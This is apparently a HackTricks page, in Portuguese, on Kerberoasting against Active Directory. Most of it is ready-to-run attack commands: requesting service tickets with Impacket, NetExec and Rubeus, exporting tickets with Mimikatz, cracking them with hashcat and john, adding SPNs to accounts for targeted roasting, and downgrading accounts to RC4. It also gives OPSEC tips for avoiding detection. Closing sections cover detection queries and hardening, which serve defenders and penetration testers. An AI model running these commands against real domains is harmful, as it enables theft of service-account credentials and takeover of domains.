# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting concentra-se na aquisição de tickets TGS, especificamente aqueles relacionados a serviços que operam sob contas de usuário no Active Directory (AD), excluindo contas de computador. A criptografia desses tickets utiliza chaves originadas das senhas dos usuários, permitindo o cracking offline de credenciais. O uso de uma conta de usuário como serviço é indicado por uma propriedade ServicePrincipalName (SPN) não vazia.

Qualquer usuário autenticado do domínio pode solicitar tickets TGS, portanto, não são necessários privilégios especiais.<sup>[[4]](#references)[[5]](#references)</sup>

### Pontos principais

- Tem como alvo tickets TGS de serviços executados sob contas de usuário (ou seja, contas com SPN definido; não contas de computador).
- Os tickets são criptografados com uma chave derivada da senha da conta de serviço e podem ser cracked offline.
- Não são necessários privilégios elevados; qualquer conta autenticada pode solicitar tickets TGS.

> [!WARNING]
> A maioria das ferramentas públicas prefere solicitar tickets de serviço RC4-HMAC (etype 23), pois eles são mais rápidos de crackear do que AES. Os hashes TGS RC4 começam com `$krb5tgs$23$*`, os AES128 com `$krb5tgs$17$*` e os AES256 com `$krb5tgs$18$*`. No entanto, muitos ambientes estão migrando para AES-only. Não presuma que apenas RC4 é relevante.
> Além disso, evite o roasting do tipo “spray-and-pray”. O kerberoast padrão do Rubeus pode consultar e solicitar tickets para todos os SPNs, gerando ruído. Enumere e tenha como alvo os principals interessantes primeiro.

### Segredos de contas de serviço e custo da criptografia Kerberos

Muitos serviços ainda são executados sob contas de usuário com senhas gerenciadas manualmente. O KDC criptografa os tickets de serviço com chaves derivadas dessas senhas e entrega o ciphertext a qualquer principal autenticado; assim, o kerberoasting permite tentativas offline ilimitadas sem lockouts ou telemetria do DC. O modo de criptografia determina o orçamento de cracking:

| Modo | Derivação da chave | Tipo de criptografia | Throughput aproximado da RTX 5090* | Observações |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 com 4.096 iterações e um salt por principal gerado a partir do domínio + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 milhões de tentativas/s | O salt impede rainbow tables, mas ainda permite o cracking rápido de senhas curtas. |
| RC4 + NT hash | Um único MD4 da senha (NT hash sem salt); o Kerberos apenas mistura um confounder de 8 bytes por ticket | etype 23 (`$krb5tgs$23$`) | ~4,18 **bilhões** de tentativas/s | ~1000× mais rápido que AES; atacantes forçam RC4 sempre que `msDS-SupportedEncryptionTypes` permite. |

*Benchmarks de Chick3nman, conforme citado na [análise de Kerberoasting de Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

O confounder do RC4 apenas randomiza o keystream; ele não adiciona trabalho por tentativa. A menos que as contas de serviço dependam de secrets aleatórios (gMSA/dMSA, contas de máquina ou strings gerenciadas por vault), a velocidade do comprometimento depende exclusivamente do orçamento de GPU. Aplicar etypes AES-only remove o downgrade de um bilhão de tentativas por segundo, mas senhas humanas fracas ainda podem ser quebradas pelo PBKDF2.<sup>[[3]](#references)</sup>

### Ataque

#### Linux

Um exemplo prático de ponta a ponta usando NetExec para solicitar tickets vulneráveis a roasting e Hashcat para crackeá-los está disponível na referência [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Ferramentas multifuncionais que incluem verificações de kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerar usuários kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Técnica 1: Solicitar TGS e fazer dump da memória
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Ferramentas automáticas
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Uma solicitação TGS gera o Windows Security Event 4769 (um ticket de serviço Kerberos foi solicitado).

### OPSEC e ambientes somente AES

- Solicite RC4 intencionalmente para contas sem AES:
- Rubeus: `/rc4opsec` usa tgtdeleg para enumerar contas sem AES e solicita tickets de serviço RC4.
- Rubeus: `/tgtdeleg` com kerberoast também aciona solicitações RC4 quando possível.<sup>[[6]](#references)</sup>
- Faça roast de contas somente AES em vez de falhar silenciosamente:
- Rubeus: `/aes` enumera contas com AES habilitado e solicita tickets de serviço AES (etype 17/18).
- Se você já possui um TGT (PTT ou de um .kirbi), pode usar `/ticket:<blob|path>` com `/spn:<SPN>` ou `/spns:<file>` e ignorar o LDAP.
- Direcionamento, limitação de requisições e menos ruído:
- Use `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtre senhas provavelmente fracas usando `/pwdsetbefore:<MM-dd-yyyy>` (senhas antigas) ou direcione OUs privilegiadas com `/ou:<DN>`.<sup>[[8]](#references)</sup>

Exemplos (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Se você controla ou pode modificar uma conta, pode torná-la kerberoastable adicionando um SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Downgrade de uma conta para habilitar RC4 e facilitar o cracking (requer privilégios de escrita no objeto-alvo):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll sobre um usuário (SPN temporário)

Quando o BloodHound mostra que você tem controle sobre um objeto de usuário (por exemplo, GenericWrite/GenericAll), você pode fazer “targeted-roast” de forma confiável nesse usuário específico, mesmo que ele não tenha nenhum SPN atualmente:<sup>[[9]](#references)</sup>

- Adicione um SPN temporário ao usuário controlado para torná-lo roastable.
- Solicite um TGS-REP criptografado com RC4 (etype 23) para esse SPN, para favorecer o cracking.
- Faça o cracking do hash `$krb5tgs$23$...` com o hashcat.
- Remova o SPN para reduzir o footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
One-liner do Linux (`targetedKerberoast.py` automatiza adicionar SPN -> solicitar TGS (etype 23) -> remover SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Quebre a saída com o autodetect do hashcat (modo 13100 para `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Notas de detecção: adicionar/remover SPNs produz alterações no diretório (Event ID 5136/4738 no usuário-alvo), e a solicitação de TGS gera o Event ID 4769. Considere throttling e a limpeza dos prompts.

Você pode encontrar ferramentas úteis para ataques de kerberoast aqui: https://github.com/nidem/kerberoast

Se encontrar este erro no Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, isso ocorre devido à diferença de horário local. Sincronize com o DC:

- `ntpdate <DC_IP>` (deprecated em algumas distros)
- `rdate -n <DC_IP>`

### Kerberoast sem uma conta de domínio (AS-requested STs)

Em setembro de 2022, Charlie Clark mostrou que, se um principal não exigir pre-authentication, é possível obter um service ticket por meio de um KRB_AS_REQ criado especificamente, alterando o sname no corpo da solicitação e obtendo efetivamente um service ticket em vez de um TGT. Isso é semelhante ao AS-REP roasting e não exige credenciais de domínio válidas.

Veja os detalhes no write-up da Semperis, “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Você deve fornecer uma lista de usuários, pois, sem credenciais válidas, não é possível consultar o LDAP com esta técnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Relacionado

Se você estiver tendo como alvo usuários AS-REP roastable, veja também:

{{#ref}}
asreproast.md
{{#endref}}

### Detecção

Kerberoasting pode ser furtivo. Procure o Event ID 4769 nos DCs e aplique filtros para reduzir o ruído:

- Exclua o nome do serviço `krbtgt` e os nomes de serviço que terminam com `$` (contas de computador).
- Exclua solicitações de contas de máquina (`*$$@*`).
- Considere apenas solicitações bem-sucedidas (Failure Code `0x0`).
- Monitore os tipos de criptografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Não gere alertas apenas para `0x17`.

Exemplo de triagem com PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Estabeleça um baseline do uso normal de SPN por host/usuário; gere alertas para grandes bursts de solicitações de SPNs distintos a partir de um único principal.
- Sinalize o uso incomum de RC4 em domínios protegidos com AES.

### Mitigation / Hardening

- Use gMSA/dMSA ou contas de máquina para serviços. As contas gerenciadas têm senhas aleatórias com mais de 120 caracteres e fazem rotação automática, tornando o cracking offline impraticável.<sup>[[7]](#references)</sup>
- Force o uso de AES nas contas de serviço definindo `msDS-SupportedEncryptionTypes` somente para AES (decimal 24 / hexadecimal 0x18) e, em seguida, faça a rotação da senha para que as chaves AES sejam derivadas.<sup>[[7]](#references)</sup>
- Sempre que possível, desative RC4 no seu ambiente e monitore tentativas de uso de RC4. Nos DCs, você pode usar o valor de registro `DefaultDomainSupportedEncTypes` para definir os padrões das contas que não têm `msDS-SupportedEncryptionTypes` configurado. Teste completamente.
- Remova SPNs desnecessários das contas de usuário.<sup>[[7]](#references)</sup>
- Use senhas longas e aleatórias para contas de serviço (25 ou mais caracteres) se não for possível usar contas gerenciadas; proíba senhas comuns e faça auditorias regularmente.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + cracking com hashcat na prática](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: ataques de baixo nível e alto impacto usando criptografia Kerberos legada (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Como atacar o Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Abuso do Kerberos no Active Directory: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: solicitando TGS criptografado com RC4 quando o AES está habilitado](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Orientações da Microsoft para ajudar a mitigar Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – documentação do comando kerberoast do Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — credenciais do SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Novos caminhos de ataque? AS Requested Service Tickets (Charlie Clark, setembro de 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
